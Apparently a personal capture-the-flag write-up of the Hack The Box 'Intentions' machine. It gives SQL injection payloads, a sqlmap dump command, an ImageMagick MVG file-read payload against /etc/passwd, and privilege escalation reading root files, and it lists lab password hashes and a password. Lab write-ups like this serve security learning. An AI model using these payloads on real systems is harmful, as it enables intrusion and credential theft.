@@ -1,0 +1,138 @@
+=================================================================================================
+													******** HTB - machines: Intentions ********
+==================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.217
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.217
+PORT   STATE SERVICE
+
+22/tcp open  ssh
+80/tcp open  http
+
+** nmap -n -Pn -p80,22 -sC -sV $IP
+
+Nmap scan report for 10.10.11.220
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
+|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Intentions
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+===============================================================================================
+-- Host Enumeration:
+====================
+OS: Linux Ubuntu
+Web server: Nginx 1.18.0
+Web App Technology:
+
+-- User creds:
+==============
+steve@intentions.htb	$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
+greg@intentions.htb		$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
+
+username: greg
+password: Gr3g1sTh3B3stDev3l0per!1998!
+
+===============================================================================================
+-- Host Walkthrough:
+====================
+On manual inspection of the web app, I could see that it uses an MVC like React.js or similar.
+
+There was nothing interesting in the source code of the web page so i went on to ispect other 
+features of the web app.
+
+In the edit profile section, we could edit the 'favorite genres' part of the user's profile. Testing
+for SQLi using the normal ' oR 1=1 -- -' didnt work. But below slqi input worked.
+
+** ')/**/OR/**/1=1/**/#
+
+The above injection returned all the feeds in the db. The fav genres and feed sections are related as
+editing the fev genres affteds whats returned in the feed section.
+
+From here, we can enumerate the db for tables, columns and all. By using burpsuite we see that the
+API call retunred 6 data sections in each json response which means we might have 6 columns.
+
+** ')/**/order/**/by/**/5#'				Enumerate number of columns
+** ')/**/union/**/select/**/null,database(),null,null,null,null#
+** ‘)/**/union/**/select/**/null,table_name,null,null,null/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/’intentions’#
+** ‘)/**/union/**/select/**/null,column_name,null,null,null/**/from/**/information_schema.columns/**/where/**/table_schema/**/=/**/’intentions’#
+** ‘)/**/union/**/select/**/null,group_concat(email,password,admin),null,null,null/**/from/**/users/**/where/**/admin/**/=/**/’1'#
+
+The above injections revealed that we have 5 columns and the db name is 'intensions'. We were also 
+able to get valid user emails and passwords.
+
+From here we can use sqlmap to dump columns in the intensions database using the feed and genre 
+requests save into a file from burpsuite.
+
+** sqlmap -r req1.txt --second-req req2.txt --dbs -D intentions -T users -C admin,email,password --where "admin=1" --dump --tamper=space2comment --batch --time-sec 10
+
+Since it was difficult to crack the hash, I did a directory fuzing on the js file path.
+
+** dirsearch -u http://10.10.11.220/js -e js
+
+From the above command is saw a 'admin.js' page. on viewing that page directly and searching for 
+'api' keyword, I saw a '/api/v2/admin/image/' API path.
+
+Using this i tested if the path '/api/v2/auth/login' existed but sending it in burp and using an 
+email and password json field.
+
+Instead, i got an error saying that the hash field is required. I then used the user creds from the 
+db to login which i logged in successfully on burpsuite.
+
+to do this on the browser, i intersected the normal login request, edited the API path to v2, edited
+the password field to hash and sent the request.
+
+I got logged in as steve and i was able to access the '/admin/' page.
+
+From the admin page there is an images section where there is a link to edit the image. On clicking
+this link, and editing, tjen checking burp, I could see that I can exploit an LFI with below:
+
+** mvg:/etc/passwd[20x20+20+20]
+
+This returns the passwd file on the host. We can use this to further enum the host. In the image 
+modify page we could see the file path to where the web app is hosted on the machine.
+
+** mvg:/var/www/html/intentions/routes/api.php[20x20+20+20]
+
+After reading the file we see that we can exploit 'Arbitrary Object Instantiations in PHP without'
+'Custom Classes' See: https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
+
+With these we were able to gain RCE/revshell. From listing the files in the web app's directory, we
+see that there is a .git folder.
+
+WE compres and download this git folder and ue git log to see the password for the user 'steve'
+
+** tar -cvf /tmp/git.tar .git
+** ls /tmp/git.tar
+** /tmp/git.tar
+** cd public
+** mv /tmp/git.tar .
+** wget http://victim_IP:port/git.tar
+** git log
+** git show 36b4287cf2fb356d868e71dc1ac90fc8fa99d319			View the username and password of steve.
+
+With these valid user creds, I was able to ssh into th ehost and get the user flag.
+
+for privesc, i noticed the user was part of the scanner group. By using find command, i could get
+that the file '/opt/scanner/scanner' is owned by root and also part of the scanner group.
+
+** find / -type f -group 'scanner' 2>/dev/null
+
+Next to verify the location of the root flag i ran the below command
+
+** /opt/scanner/scanner -c /root/root.txt -l 1 -p -s 1111
+
+To read the contents of this file i ran a python script gotten from the tutorial of this machine at:
+https://techyrick.com/intentions-htb-writeup/
+
+With this script got to read the contents of this file.
+
+
